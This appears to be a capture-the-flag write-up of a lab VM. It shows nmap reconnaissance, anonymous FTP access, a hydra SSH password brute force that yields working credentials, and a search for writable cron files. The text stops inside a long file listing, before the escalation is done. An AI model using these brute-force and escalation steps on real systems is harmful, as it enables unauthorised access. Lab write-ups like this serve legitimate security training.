# RECON

Ran an nmap scan on the VM ip.
```
└─# nmap -sV -sC -A -Pn 192.168.1.122
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-24 20:09 +04
Nmap scan report for 192.168.1.122
Host is up (0.017s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.1.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d618d9ef75d31c29be14b52b1854a9c0 (DSA)
|   2048 ee8c64874439538c24fe9d39a9adeadb (RSA)
|   256 0e66e650cf563b9c678b5f56caae6bf4 (ECDSA)
|_  256 b28be2465ceffddc72f7107e045f2585 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/secret
MAC Address: 1A:D6:C7:96:8E:02 (Unknown)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT      ADDRESS
1   17.24 ms 192.168.1.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.78 seconds
```
From the scan we know that we can ftp to the machine since anonymous login is allowed.
```
└─# ftp anonymous@192.168.1.122
Connected to 192.168.1.122.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7211|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
226 Directory send OK.
ftp> 
```
There is nothing else besides this lol.pcap file which after examining for a while didnt get me anywhere.
Next I went onto the 192.168.1.122:80 and found only an image and nothing useful in the page source, same with following the /secret url path from the robots.txt file.
I went back to examine the lol.pcap file and tried 'sup3rs3cr3tdirlol' as a url path from 'Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P
Sucks, you were so close... gotta TRY HARDER!' since this box is obnoxious and it leads to a file called roflmao. I wget the file to examine and run it.
```
└─# wget http://192.168.1.122/sup3rs3cr3tdirlol/roflmao
--2023-04-25 16:09:27--  http://192.168.1.122/sup3rs3cr3tdirlol/roflmao
Connecting to 192.168.1.122:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7296 (7.1K)
Saving to: ‘roflmao’

roflmao                                                     100%[=========================================================================================================================================>]   7.12K  --.-KB/s    in 0.01s   

2023-04-25 16:09:27 (705 KB/s) - ‘roflmao’ saved [7296/7296]
```
Nothing noticeable was found in the file so I decided to run it.
and it gave the following output.
```
└─# ./roflmao
Find address 0x0856BF to proceed
```
I used '0x0856BF' as a url path to get two directories.
good_luck/
this_folder_contains_the_password/
good_luck/ has a text file named 'which_one_lol.txt' which seems to be usernames. I save it for a brute force hydra script.
this_folder_contains_the_password/ has a text file named 'Pass.txt' which just says 'Good_job_:)'. I save that too and run a hydra scan as follows.
# EXPLOITATION
```
└─# hydra -L which_one_lol.txt -P Pass.txt 192.168.1.122 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 16:22:04
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.1.122:22/
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-25 16:22:08
```
I after a while try the password as 'Pass.txt' instead the file to see if that works and it does for the user 'overflow'.
```
└─# hydra -L which_one_lol.txt -p 'Pass.txt' 192.168.1.122 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-25 16:24:38
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:10/p:1), ~1 try per task
[DATA] attacking ssh://192.168.1.122:22/
[22][ssh] host: 192.168.1.122   login: overflow   password: Pass.txt
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-25 16:24:46
```
Now we login with ssh.
# ESCALATION
```
└─# ssh overflow@192.168.1.122
overflow@192.168.1.122's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 24 10:39:36 2023 from 192.168.1.135
Could not chdir to home directory /home/overflow: No such file or directory
$ 

```
Running lsb_release -a gives us the following.
```
$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.1 LTS
Release:	14.04
Codename:	trusty
```
I then ran the following to check for files which i can edit and found a cronlog with python file called 'cleaner.py' which ran every two minutes i think.
```
$ find / -writable -type f 2>/dev/null
/srv/ftp/lol.pcap
/var/tmp/cleaner.py.swp
/var/www/html/sup3rs3cr3tdirlol/roflmao
/var/log/cronlog
/sys/fs/cgroup/systemd/user/1002.user/7.session/tasks
/sys/fs/cgroup/systemd/user/1002.user/7.session/cgroup.event_control
/sys/fs/cgroup/systemd/user/1002.user/7.session/cgroup.procs
/sys/fs/cgroup/systemd/user/1002.user/cgroup.event_control
/sys/fs/cgroup/systemd/user/cgroup.event_control
/sys/fs/cgroup/systemd/cgroup.event_control
/sys/kernel/security/apparmor/.access
/proc/sys/kernel/ns_last_pid
/proc/1/task/1/attr/current
/proc/1/task/1/attr/exec
/proc/1/task/1/attr/fscreate
/proc/1/task/1/attr/keycreate
/proc/1/task/1/attr/sockcreate
/proc/1/attr/current
/proc/1/attr/exec
/proc/1/attr/fscreate
/proc/1/attr/keycreate
/proc/1/attr/sockcreate
/proc/2/task/2/attr/current
/proc/2/task/2/attr/exec
/proc/2/task/2/attr/fscreate
/proc/2/task/2/attr/keycreate
/proc/2/task/2/attr/sockcreate
/proc/2/attr/current
/proc/2/attr/exec
/proc/2/attr/fscreate
/proc/2/attr/keycreate
/proc/2/attr/sockcreate
/proc/3/task/3/attr/current
/proc/3/task/3/attr/exec
/proc/3/task/3/attr/fscreate
/proc/3/task/3/attr/keycreate
/proc/3/task/3/attr/sockcreate
/proc/3/attr/current
/proc/3/attr/exec
/proc/3/attr/fscreate
/proc/3/attr/keycreate
/proc/3/attr/sockcreate
/proc/4/task/4/attr/current
/proc/4/task/4/attr/exec
/proc/4/task/4/attr/fscreate
/proc/4/task/4/attr/keycreate
/proc/4/task/4/attr/sockcreate
/proc/4/attr/current
/proc/4/attr/exec
/proc/4/attr/fscreate
/proc/4/attr/keycreate
/proc/4/attr/sockcreate
/proc/5/task/5/attr/current
/proc/5/task/5/attr/exec
/proc/5/task/5/attr/fscreate
/proc/5/task/5/attr/keycreate
/proc/5/task/5/attr/sockcreate
/proc/5/attr/current
/proc/5/attr/exec
/proc/5/attr/fscreate
/proc/5/attr/keycreate
/proc/5/attr/sockcreate
/proc/7/task/7/attr/current
/proc/7/task/7/attr/exec
/proc/7/task/7/attr/fscreate
/proc/7/task/7/attr/keycreate
/proc/7/task/7/attr/sockcreate
/proc/7/attr/current
/proc/7/attr/exec
/proc/7/attr/fscreate
/proc/7/attr/keycreate
/proc/7/attr/sockcreate
/proc/8/task/8/attr/current
/proc/8/task/8/attr/exec
/proc/8/task/8/attr/fscreate
/proc/8/task/8/attr/keycreate
/proc/8/task/8/attr/sockcreate
/proc/8/attr/current
/proc/8/attr/exec
/proc/8/attr/fscreate
/proc/8/attr/keycreate
/proc/8/attr/sockcreate
/proc/9/task/9/attr/current
/proc/9/task/9/attr/exec
/proc/9/task/9/attr/fscreate
/proc/9/task/9/attr/keycreate
/proc/9/task/9/attr/sockcreate
/proc/9/attr/current
/proc/9/attr/exec
/proc/9/attr/fscreate
/proc/9/attr/keycreate
/proc/9/attr/sockcreate
/proc/10/task/10/attr/current
/proc/10/task/10/attr/exec
/proc/10/task/10/attr/fscreate
/proc/10/task/10/attr/keycreate
/proc/10/task/10/attr/sockcreate
/proc/10/attr/current
/proc/10/attr/exec
/proc/10/attr/fscreate
/proc/10/attr/keycreate
/proc/10/attr/sockcreate
/proc/11/task/11/attr/current
/proc/11/task/11/attr/exec
/proc/11/task/11/attr/fscreate
/proc/11/task/11/attr/keycreate
/proc/11/task/11/attr/sockcreate
/proc/11/attr/current
/proc/11/attr/exec
/proc/11/attr/fscreate
/proc/11/attr/keycreate
/proc/11/attr/sockcreate
/proc/12/task/12/attr/current
/proc/12/task/12/attr/exec
/proc/12/task/12/attr/fscreate
/proc/12/task/12/attr/keycreate
/proc/12/task/12/attr/sockcreate
/proc/12/attr/current
/proc/12/attr/exec
/proc/12/attr/fscreate
/proc/12/attr/keycreate
/proc/12/attr/sockcreate
/proc/13/task/13/attr/current
/proc/13/task/13/attr/exec
/proc/13/task/13/attr/fscreate
/proc/13/task/13/attr/keycreate
/proc/13/task/13/attr/sockcreate
/proc/13/attr/current
/proc/13/attr/exec
/proc/13/attr/fscreate
/proc/13/attr/keycreate
/proc/13/attr/sockcreate
/proc/14/task/14/attr/current
/proc/14/task/14/attr/exec
/proc/14/task/14/attr/fscreate
/proc/14/task/14/attr/keycreate
/proc/14/task/14/attr/sockcreate
/proc/14/attr/current
/proc/14/attr/exec
/proc/14/attr/fscreate
/proc/14/attr/keycreate
/proc/14/attr/sockcreate
/proc/15/task/15/attr/current
/proc/15/task/15/attr/exec
/proc/15/task/15/attr/fscreate
/proc/15/task/15/attr/keycreate
/proc/15/task/15/attr/sockcreate
/proc/15/attr/current
/proc/15/attr/exec
/proc/15/attr/fscreate
/proc/15/attr/keycreate
/proc/15/attr/sockcreate
/proc/16/task/16/attr/current
/proc/16/task/16/attr/exec
/proc/16/task/16/attr/fscreate
/proc/16/task/16/attr/keycreate
/proc/16/task/16/attr/sockcreate
/proc/16/attr/current
/proc/16/attr/exec
/proc/16/attr/fscreate
/proc/16/attr/keycreate
/proc/16/attr/sockcreate
/proc/17/task/17/attr/current
/proc/17/task/17/attr/exec
/proc/17/task/17/attr/fscreate
/proc/17/task/17/attr/keycreate
/proc/17/task/17/attr/sockcreate
/proc/17/attr/current
/proc/17/attr/exec
/proc/17/attr/fscreate
/proc/17/attr/keycreate
/proc/17/attr/sockcreate
/proc/18/task/18/attr/current
/proc/18/task/18/attr/exec
/proc/18/task/18/attr/fscreate
/proc/18/task/18/attr/keycreate
/proc/18/task/18/attr/sockcreate
/proc/18/attr/current
/proc/18/attr/exec
/proc/18/attr/fscreate
/proc/18/attr/keycreate
/proc/18/attr/sockcreate
/proc/19/task/19/attr/current
/proc/19/task/19/attr/exec
/proc/19/task/19/attr/fscreate
/proc/19/task/19/attr/keycreate
/proc/19/task/19/attr/sockcreate
/proc/19/attr/current
/proc/19/attr/exec
/proc/19/attr/fscreate
/proc/19/attr/keycreate
/proc/19/attr/sockcreate
/proc/20/task/20/attr/current
/proc/20/task/20/attr/exec
/proc/20/task/20/attr/fscreate
/proc/20/task/20/attr/keycreate
/proc/20/task/20/attr/sockcreate
/proc/20/attr/current
/proc/20/attr/exec
/proc/20/attr/fscreate
/proc/20/attr/keycreate
/proc/20/attr/sockcreate
/proc/21/task/21/attr/current
/proc/21/task/21/attr/exec
/proc/21/task/21/attr/fscreate
/proc/21/task/21/attr/keycreate
/proc/21/task/21/attr/sockcreate
/proc/21/attr/current
/proc/21/attr/exec
/proc/21/attr/fscreate
/proc/21/attr/keycreate
/proc/21/attr/sockcreate
/proc/22/task/22/attr/current
/proc/22/task/22/attr/exec
/proc/22/task/22/attr/fscreate
/proc/22/task/22/attr/keycreate
/proc/22/task/22/attr/sockcreate
/proc/22/attr/current
/proc/22/attr/exec
/proc/22/attr/fscreate
/proc/22/attr/keycreate
/proc/22/attr/sockcreate
/proc/25/task/25/attr/current
/proc/25/task/25/attr/exec
/proc/25/task/25/attr/fscreate
/proc/25/task/25/attr/keycreate
/proc/25/task/25/attr/sockcreate
/proc/25/attr/current
/proc/25/attr/exec
/proc/25/attr/fscreate
/proc/25/attr/keycreate
/proc/25/attr/sockcreate
/proc/26/task/26/attr/current
/proc/26/task/26/attr/exec
/proc/26/task/26/attr/fscreate
/proc/26/task/26/attr/keycreate
/proc/26/task/26/attr/sockcreate
/proc/26/attr/current
/proc/26/attr/exec
/proc/26/attr/fscreate
/proc/26/attr/keycreate
/proc/26/attr/sockcreate
/proc/27/task/27/attr/current
/proc/27/task/27/attr/exec
/proc/27/task/27/attr/fscreate
/proc/27/task/27/attr/keycreate
/proc/27/task/27/attr/sockcreate
/proc/27/attr/current
/proc/27/attr/exec
/proc/27/attr/fscreate
/proc/27/attr/keycreate
/proc/27/attr/sockcreate
/proc/28/task/28/attr/current
/proc/28/task/28/attr/exec
/proc/28/task/28/attr/fscreate
/proc/28/task/28/attr/keycreate
/proc/28/task/28/attr/sockcreate
/proc/28/attr/current
/proc/28/attr/exec
/proc/28/attr/fscreate
/proc/28/attr/keycreate
/proc/28/attr/sockcreate
/proc/29/task/29/attr/current
/proc/29/task/29/attr/exec
/proc/29/task/29/attr/fscreate
/proc/29/task/29/attr/keycreate
/proc/29/task/29/attr/sockcreate
/proc/29/attr/current
/proc/29/attr/exec
/proc/29/attr/fscreate
/proc/29/attr/keycreate
/proc/29/attr/sockcreate
/proc/30/task/30/attr/current
/proc/30/task/30/attr/exec
/proc/30/task/30/attr/fscreate
/proc/30/task/30/attr/keycreate
/proc/30/task/30/attr/sockcreate
/proc/30/attr/current
/proc/30/attr/exec
/proc/30/attr/fscreate
/proc/30/attr/keycreate
/proc/30/attr/sockcreate
/proc/42/task/42/attr/current
/proc/42/task/42/attr/exec
/proc/42/task/42/attr/fscreate
/proc/42/task/42/attr/keycreate
/proc/42/task/42/attr/sockcreate
/proc/42/attr/current
/proc/42/attr/exec
/proc/42/attr/fscreate
/proc/42/attr/keycreate
/proc/42/attr/sockcreate
/proc/44/task/44/attr/current
/proc/44/task/44/attr/exec
/proc/44/task/44/attr/fscreate
/proc/44/task/44/attr/keycreate
/proc/44/task/44/attr/sockcreate
/proc/44/attr/current
/proc/44/attr/exec
/proc/44/attr/fscreate
/proc/44/attr/keycreate
/proc/44/attr/sockcreate
/proc/45/task/45/attr/current
/proc/45/task/45/attr/exec
/proc/45/task/45/attr/fscreate
/proc/45/task/45/attr/keycreate
/proc/45/task/45/attr/sockcreate
/proc/45/attr/current
/proc/45/attr/exec
/proc/45/attr/fscreate
/proc/45/attr/keycreate
/proc/45/attr/sockcreate
/proc/67/task/67/attr/current
/proc/67/task/67/attr/exec
/proc/67/task/67/attr/fscreate
/proc/67/task/67/attr/keycreate
/proc/67/task/67/attr/sockcreate
/proc/67/attr/current
/proc/67/attr/exec
/proc/67/attr/fscreate
/proc/67/attr/keycreate
/proc/67/attr/sockcreate
/proc/68/task/68/attr/current
/proc/68/task/68/attr/exec
/proc/68/task/68/attr/fscreate
/proc/68/task/68/attr/keycreate
/proc/68/task/68/attr/sockcreate
/proc/68/attr/current
/proc/68/attr/exec
/proc/68/attr/fscreate
/proc/68/attr/keycreate
/proc/68/attr/sockcreate
/proc/69/task/69/attr/current
/proc/69/task/69/attr/exec
/proc/69/task/69/attr/fscreate
/proc/69/task/69/attr/keycreate
/proc/69/task/69/attr/sockcreate
/proc/69/attr/current
/proc/69/attr/exec
/proc/69/attr/fscreate
/proc/69/attr/keycreate
/proc/69/attr/sockcreate
/proc/120/task/120/attr/current
/proc/120/task/120/attr/exec
/proc/120/task/120/attr/fscreate
/proc/120/task/120/attr/keycreate
/proc/120/task/120/attr/sockcreate
/proc/120/attr/current
/proc/120/attr/exec
/proc/120/attr/fscreate
/proc/120/attr/keycreate
/proc/120/attr/sockcreate
/proc/121/task/121/attr/current
/proc/121/task/121/attr/exec
/proc/121/task/121/attr/fscreate
/proc/121/task/121/attr/keycreate
/proc/121/task/121/attr/sockcreate
/proc/121/attr/current
/proc/121/attr/exec
/proc/121/attr/fscreate
/proc/121/attr/keycreate
/proc/121/attr/sockcreate
/proc/122/task/122/attr/current
/proc/122/task/122/attr/exec
/proc/122/task/122/attr/fscreate
/proc/122/task/122/attr/keycreate
/proc/122/task/122/attr/sockcreate
/proc/122/attr/current
/proc/122/attr/exec
/proc/122/attr/fscreate
/proc/122/attr/keycreate
/proc/122/attr/sockcreate
/proc/124/task/124/attr/current
/proc/124/task/124/attr/exec
/proc/124/task/124/attr/fscreate
/proc/124/task/124/attr/keycreate
/proc/124/task/124/attr/sockcreate
/proc/124/attr/current
/proc/124/attr/exec
/proc/124/attr/fscreate
/proc/124/attr/keycreate
/proc/124/attr/sockcreate
/proc/137/task/137/attr/current
/proc/137/task/137/attr/exec
/proc/137/task/137/attr/fscreate
/proc/137/task/137/attr/keycreate
/proc/137/task/137/attr/sockcreate
/proc/137/attr/current
/proc/137/attr/exec
/proc/137/attr/fscreate
/proc/137/attr/keycreate
/proc/137/attr/sockcreate
/proc/138/task/138/attr/current
/proc/138/task/138/attr/exec
/proc/138/task/138/attr/fscreate
/proc/138/task/138/attr/keycreate
/proc/138/task/138/attr/sockcreate
/proc/138/attr/current
/proc/138/attr/exec
/proc/138/attr/fscreate
/proc/138/attr/keycreate
/proc/138/attr/sockcreate
/proc/282/task/282/attr/current
/proc/282/task/282/attr/exec
/proc/282/task/282/attr/fscreate
/proc/282/task/282/attr/keycreate
/proc/282/task/282/attr/sockcreate
/proc/282/attr/current
/proc/282/attr/exec
/proc/282/attr/fscreate
/proc/282/attr/keycreate
/proc/282/attr/sockcreate
/proc/315/task/315/attr/current
/proc/315/task/315/attr/exec
/proc/315/task/315/attr/fscreate
/proc/315/task/315/attr/keycreate
/proc/315/task/315/attr/sockcreate
/proc/315/attr/current
/proc/315/attr/exec
/proc/315/attr/fscreate
/proc/315/attr/keycreate
/proc/315/attr/sockcreate
/proc/337/task/337/attr/current
/proc/337/task/337/attr/exec
/proc/337/task/337/attr/fscreate
/proc/337/task/337/attr/keycreate
/proc/337/task/337/attr/sockcreate
/proc/337/attr/current
/proc/337/attr/exec
/proc/337/attr/fscreate
/proc/337/attr/keycreate
/proc/337/attr/sockcreate
/proc/382/task/382/attr/current
/proc/382/task/382/attr/exec
/proc/382/task/382/attr/fscreate
/proc/382/task/382/attr/keycreate
/proc/382/task/382/attr/sockcreate
/proc/382/attr/current
/proc/382/attr/exec
/proc/382/attr/fscreate
/proc/382/attr/keycreate
/proc/382/attr/sockcreate
/proc/387/task/387/attr/current
/proc/387/task/387/attr/exec
/proc/387/task/387/attr/fscreate
/proc/387/task/387/attr/keycreate
/proc/387/task/387/attr/sockcreate
/proc/387/task/388/attr/current
/proc/387/task/388/attr/exec
/proc/387/task/388/attr/fscreate
/proc/387/task/388/attr/keycreate
/proc/387/task/388/attr/sockcreate
/proc/387/task/389/attr/current
/proc/387/task/389/attr/exec
/proc/387/task/389/attr/fscreate
/proc/387/task/389/attr/keycreate
/proc/387/task/389/attr/sockcreate
/proc/387/task/390/attr/current
/proc/387/task/390/attr/exec
/proc/387/task/390/attr/fscreate
/proc/387/task/390/attr/keycreate
/proc/387/task/390/attr/sockcreate
/proc/387/attr/current
/proc/387/attr/exec
/proc/387/attr/fscreate
/proc/387/attr/keycreate
/proc/387/attr/sockcreate
/proc/393/task/393/attr/current
/proc/393/task/393/attr/exec
/proc/393/task/393/attr/fscreate
/proc/393/task/393/attr/keycreate
/proc/393/task/393/attr/sockcreate
/proc/393/attr/current
/proc/393/attr/exec
/proc/393/attr/fscreate
/proc/393/attr/keycreate
/proc/393/attr/sockcreate
/proc/423/task/423/attr/current
/proc/423/task/423/attr/exec
/proc/423/task/423/attr/fscreate
/proc/423/task/423/attr/keycreate
/proc/423/task/423/attr/sockcreate
/proc/423/attr/current
/proc/423/attr/exec
/proc/423/attr/fscreate
/proc/423/attr/keycreate
/proc/423/attr/sockcreate
/proc/424/task/424/attr/current
/proc/424/task/424/attr/exec
/proc/424/task/424/attr/fscreate
/proc/424/task/424/attr/keycreate
/proc/424/task/424/attr/sockcreate
/proc/424/attr/current
/proc/424/attr/exec
/proc/424/attr/fscreate
/proc/424/attr/keycreate
/proc/424/attr/sockcreate
/proc/426/task/426/attr/current
/proc/426/task/426/attr/exec
/proc/426/task/426/attr/fscreate
/proc/426/task/426/attr/keycreate
/proc/426/task/426/attr/sockcreate
/proc/426/attr/current
/proc/426/attr/exec
/proc/426/attr/fscreate
/proc/426/attr/keycreate
/proc/426/attr/sockcreate
/proc/432/task/432/attr/current
/proc/432/task/432/attr/exec
/proc/432/task/432/attr/fscreate
/proc/432/task/432/attr/keycreate
/proc/432/task/432/attr/sockcreate
/proc/432/attr/current
/proc/432/attr/exec
/proc/432/attr/fscreate
/proc/432/attr/keycreate
/proc/432/attr/sockcreate
/proc/556/task/556/attr/current
/proc/556/task/556/attr/exec
/proc/556/task/556/attr/fscreate
/proc/556/task/556/attr/keycreate
/proc/556/task/556/attr/sockcreate
/proc/556/attr/current
/proc/556/attr/exec
/proc/556/attr/fscreate
/proc/556/attr/keycreate
/proc/556/attr/sockcreate
/proc/642/task/642/attr/current
/proc/642/task/642/attr/exec
/proc/642/task/642/attr/fscreate
/proc/642/task/642/attr/keycreate
/proc/642/task/642/attr/sockcreate
/proc/642/attr/current
/proc/642/attr/exec
/proc/642/attr/fscreate
/proc/642/attr/keycreate
/proc/642/attr/sockcreate
/proc/691/task/691/attr/current
/proc/691/task/691/attr/exec
/proc/691/task/691/attr/fscreate
/proc/691/task/691/attr/keycreate
/proc/691/task/691/attr/sockcreate
/proc/691/attr/current
/proc/691/attr/exec
/proc/691/attr/fscreate
/proc/691/attr/keycreate
/proc/691/attr/sockcreate
/proc/781/task/781/attr/current
/proc/781/task/781/attr/exec
/proc/781/task/781/attr/fscreate
/proc/781/task/781/attr/keycreate
/proc/781/task/781/attr/sockcreate
/proc/781/attr/current
/proc/781/attr/exec
/proc/781/attr/fscreate
/proc/781/attr/keycreate
/proc/781/attr/sockcreate
/proc/784/task/784/attr/current
/proc/784/task/784/attr/exec
/proc/784/task/784/attr/fscreate
/proc/784/task/784/attr/keycreate
/proc/784/task/784/attr/sockcreate
/proc/784/attr/current
/proc/784/attr/exec
/proc/784/attr/fscreate
/proc/784/attr/keycreate
/proc/784/attr/sockcreate
/proc/787/task/787/attr/current
/proc/787/task/787/attr/exec
/proc/787/task/787/attr/fscreate
/proc/787/task/787/attr/keycreate
/proc/787/task/787/attr/sockcreate
/proc/787/attr/current
/proc/787/attr/exec
/proc/787/attr/fscreate
/proc/787/attr/keycreate
/proc/787/attr/sockcreate
/proc/788/task/788/attr/current
/proc/788/task/788/attr/exec
/proc/788/task/788/attr/fscreate
/proc/788/task/788/attr/keycreate
/proc/788/task/788/attr/sockcreate
/proc/788/attr/current
/proc/788/attr/exec
/proc/788/attr/fscreate
/proc/788/attr/keycreate
/proc/788/attr/sockcreate
/proc/790/task/790/attr/current
/proc/790/task/790/attr/exec
/proc/790/task/790/attr/fscreate
/proc/790/task/790/attr/keycreate
/proc/790/task/790/attr/sockcreate
/proc/790/attr/current
/proc/790/attr/exec
/proc/790/attr/fscreate
/proc/790/attr/keycreate
/proc/790/attr/sockcreate
/proc/811/task/811/attr/current
/proc/811/task/811/attr/exec
/proc/811/task/811/attr/fscreate
/proc/811/task/811/attr/keycreate
/proc/811/task/811/attr/sockcreate
/proc/811/attr/current
/proc/811/attr/exec
/proc/811/attr/fscreate
/proc/811/attr/keycreate
/proc/811/attr/sockcreate
/proc/815/task/815/attr/current
/proc/815/task/815/attr/exec
/proc/815/task/815/attr/fscreate
/proc/815/task/815/attr/keycreate
/proc/815/task/815/attr/sockcreate
/proc/815/attr/current
/proc/815/attr/exec
/proc/815/attr/fscreate
/proc/815/attr/keycreate
/proc/815/attr/sockcreate
/proc/1139/task/1139/attr/current
/proc/1139/task/1139/attr/exec
/proc/1139/task/1139/attr/fscreate
/proc/1139/task/1139/attr/keycreate
/proc/1139/task/1139/attr/sockcreate
/proc/1139/attr/current
/proc/1139/attr/exec
/proc/1139/attr/fscreate
/proc/1139/attr/keycreate
/proc/1139/attr/sockcreate
/proc/1142/task/1142/attr/current
/proc/1142/task/1142/attr/exec
/proc/1142/task/1142/attr/fscreate
/proc/1142/task/1142/attr/keycreate
/proc/1142/task/1142/attr/sockcreate
/proc/1142/task/1172/attr/current
/proc/1142/task/1172/attr/exec
/proc/1142/task/1172/attr/fscreate
/proc/1142/task/1172/attr/keycreate
/proc/1142/task/1172/attr/sockcreate
/proc/1142/task/1173/attr/current
/proc/1142/task/1173/attr/exec
/proc/1142/task/1173/attr/fscreate
/proc/1142/task/1173/attr/keycreate
/proc/1142/task/1173/attr/sockcreate
/proc/1142/task/1174/attr/current
/proc/1142/task/1174/attr/exec
/proc/1142/task/1174/attr/fscreate
/proc/1142/task/1174/attr/keycreate
/proc/1142/task/1174/attr/sockcreate
/proc/1142/task/1175/attr/current
/proc/1142/task/1175/attr/exec
/proc/1142/task/1175/attr/fscreate
/proc/1142/task/1175/attr/keycreate
/proc/1142/task/1175/attr/sockcreate
/proc/1142/task/1176/attr/current
/proc/1142/task/1176/attr/exec
/proc/1142/task/1176/attr/fscreate
/proc/1142/task/1176/attr/keycreate
/proc/1142/task/1176/attr/sockcreate
/proc/1142/task/1177/attr/current
/proc/1142/task/1177/attr/exec
/proc/1142/task/1177/attr/fscreate
/proc/1142/task/1177/attr/keycreate
/proc/1142/task/1177/attr/sockcreate
/proc/1142/task/1178/attr/current
/proc/1142/task/1178/attr/exec
/proc/1142/task/1178/attr/fscreate
/proc/1142/task/1178/attr/keycreate
/proc/1142/task/1178/attr/sockcreate
/proc/1142/task/1179/attr/current
/proc/1142/task/1179/attr/exec
/proc/1142/task/1179/attr/fscreate
/proc/1142/task/1179/attr/keycreate
/proc/1142/task/1179/attr/sockcreate
/proc/1142/task/1180/attr/current
/proc/1142/task/1180/attr/exec
/proc/1142/task/1180/attr/fscreate
/proc/1142/task/1180/attr/keycreate
/proc/1142/task/1180/attr/sockcreate
/proc/1142/task/1181/attr/current
/proc/1142/task/1181/attr/exec
/proc/1142/task/1181/attr/fscreate
/proc/1142/task/1181/attr/keycreate
/proc/1142/task/1181/attr/sockcreate
/proc/1142/task/1182/attr/current
/proc/1142/task/1182/attr/exec
/proc/1142/task/1182/attr/fscreate
/proc/1142/task/1182/attr/keycreate
/proc/1142/task/1182/attr/sockcreate
/proc/1142/task/1183/attr/current
/proc/1142/task/1183/attr/exec
/proc/1142/task/1183/attr/fscreate
/proc/1142/task/1183/attr/keycreate
/proc/1142/task/1183/attr/sockcreate
/proc/1142/task/1184/attr/current
/proc/1142/task/1184/attr/exec
/proc/1142/task/1184/attr/fscreate
/proc/1142/task/1184/attr/keycreate
/proc/1142/task/1184/attr/sockcreate
/proc/1142/task/1185/attr/current
/proc/1142/task/1185/attr/exec
/proc/1142/task/1185/attr/fscreate
/proc/1142/task/1185/attr/keycreate
/proc/1142/task/1185/attr/sockcreate
/proc/1142/task/1186/attr/current
/proc/1142/task/1186/attr/exec
/proc/1142/task/1186/attr/fscreate
/proc/1142/task/1186/attr/keycreate
/proc/1142/task/1186/attr/sockcreate
/proc/1142/task/1187/attr/current
/proc/1142/task/1187/attr/exec
/proc/1142/task/1187/attr/fscreate
/proc/1142/task/1187/attr/keycreate
/proc/1142/task/1187/attr/sockcreate
/proc/1142/task/1188/attr/current
/proc/1142/task/1188/attr/exec
/proc/1142/task/1188/attr/fscreate
/proc/1142/task/1188/attr/keycreate
/proc/1142/task/1188/attr/sockcreate
/proc/1142/task/1189/attr/current
/proc/1142/task/1189/attr/exec
/proc/1142/task/1189/attr/fscreate
/proc/1142/task/1189/attr/keycreate
/proc/1142/task/1189/attr/sockcreate
/proc/1142/task/1190/attr/current
/proc/1142/task/1190/attr/exec
/proc/1142/task/1190/attr/fscreate
/proc/1142/task/1190/attr/keycreate
/proc/1142/task/1190/attr/sockcreate
/proc/1142/task/1191/attr/current
/proc/1142/task/1191/attr/exec
/proc/1142/task/1191/attr/fscreate
/proc/1142/task/1191/attr/keycreate
/proc/1142/task/1191/attr/sockcreate
/proc/1142/task/1192/attr/current
/proc/1142/task/1192/attr/exec
/proc/1142/task/1192/attr/fscreate
/proc/1142/task/1192/attr/keycreate
